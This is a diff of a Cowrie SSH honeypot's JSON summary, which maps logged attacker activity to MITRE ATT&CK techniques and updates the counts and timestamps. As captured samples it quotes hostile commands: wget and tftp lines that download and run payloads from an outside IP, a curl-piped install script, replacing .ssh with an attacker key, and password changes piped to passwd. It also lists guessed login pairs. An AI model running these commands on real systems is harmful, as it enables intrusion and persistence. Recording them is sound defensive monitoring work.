@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-22 07:02:11",
+  "generated": "2026-09-22 08:03:42",
   "totals": {
-    "commands": 317,
-    "login_failed": 1589,
-    "login_success": 49,
-    "sessions": 1749
+    "commands": 418,
+    "login_failed": 2230,
+    "login_success": 63,
+    "sessions": 2434
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1589,
+      "count": 2230,
       "examples": [
         "daoperator / daoperator",
         "root / User@2022",
@@ -21,14 +21,14 @@
         "root / root"
       ],
       "first": "2026-09-22T00:01:24.262742Z",
-      "last": "2026-09-22T07:01:45.682523Z",
-      "unique_ips": 37
+      "last": "2026-09-22T08:03:41.364430Z",
+      "unique_ips": 44
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 86,
+      "count": 106,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -37,14 +37,14 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-22T00:06:56.657809Z",
-      "last": "2026-09-22T07:00:07.432508Z",
-      "unique_ips": 13
+      "last": "2026-09-22T07:49:09.151175Z",
+      "unique_ips": 17
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 50,
+      "count": 69,
       "examples": [
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
@@ -53,14 +53,14 @@
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
       ],
       "first": "2026-09-22T00:06:11.162241Z",
-      "last": "2026-09-22T06:59:50.245363Z",
-      "unique_ips": 13
+      "last": "2026-09-22T07:58:40.286010Z",
+      "unique_ips": 16
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 49,
+      "count": 63,
       "examples": [
         "salam / salam",
         "experiment / experiment",
@@ -69,14 +69,14 @@
         "root / password"
       ],
       "first": "2026-09-22T00:06:10.185022Z",
-      "last": "2026-09-22T06:59:49.159988Z",
-      "unique_ips": 28
+      "last": "2026-09-22T07:57:46.463209Z",
+      "unique_ips": 35
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 21,
+      "count": 26,
       "examples": [
         "w",
         "whoami",
@@ -84,14 +84,14 @@
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-22T00:07:06.574871Z",
-      "last": "2026-09-22T07:00:06.091806Z",
-      "unique_ips": 12
+      "last": "2026-09-22T07:57:49.507199Z",
+      "unique_ips": 15
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 21,
+      "count": 26,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -100,45 +100,45 @@
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
       ],
       "first": "2026-09-22T00:06:49.812853Z",
-      "last": "2026-09-22T06:59:58.931986Z",
-      "unique_ips": 12
+      "last": "2026-09-22T07:58:40.286010Z",
+      "unique_ips": 15
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 18,
+      "count": 22,
       "examples": [
         "crontab -l",
         "top"
       ],
       "first": "2026-09-22T00:07:05.175470Z",
-      "last": "2026-09-22T07:00:04.065552Z",
-      "unique_ips": 9
+      "last": "2026-09-22T07:49:01.407370Z",
+      "unique_ips": 11
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 9,
+      "count": 11,
       "examples": [
         "ls -lh $(which ls)"
       ],
       "first": "2026-09-22T00:07:03.797814Z",
-      "last": "2026-09-22T07:00:00.715959Z",
-      "unique_ips": 9
+      "last": "2026-09-22T07:48:53.587619Z",
+      "unique_ips": 11
     },
     {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 9,
+      "count": 11,
       "examples": [
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
       ],
       "first": "2026-09-22T00:06:49.446552Z",
-      "last": "2026-09-22T06:59:50.245363Z",
-      "unique_ips": 9
+      "last": "2026-09-22T07:48:36.690447Z",
+      "unique_ips": 11
     },
     {
       "id": "T1070.004",
@@ -181,43 +181,47 @@
   "unmapped": [
     [
       "system",
-      23
+      32
     ],
     [
       "shell",
-      23
+      32
     ],
     [
       "sh",
-      22
+      31
     ],
     [
       "/bin/busybox UNSTABLE",
-      20
+      28
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       16
     ],
     [
+      "/bin/busybox",
+      7
+    ],
+    [
       "enable",
-      2
+      3
     ],
     [
       "linuxshell",
-      2
+      3
     ],
     [
       "enablelinuxshell",
-      2
+      3
     ],
     [
       "ping ;sh",
-      2
+      3
     ],
     [
       "cd /proc && cat self/cmdline",
-      2
+      3
     ],
     [
       "echo -e \"experiment\\nvyKdreJBKCyS\\nvyKdreJBKCyS\"|passwd|bash",
@@ -253,10 +257,6 @@
     ],
     [
       "echo -e \"qwe123\\niybDQbh1TWu0\\niybDQbh1TWu0\"|passwd|bash",
-      1
-    ],
-    [
-      "echo \"qwe123\\niybDQbh1TWu0\\niybDQbh1TWu0\\n\"|passwd",
       1
     ]
   ]
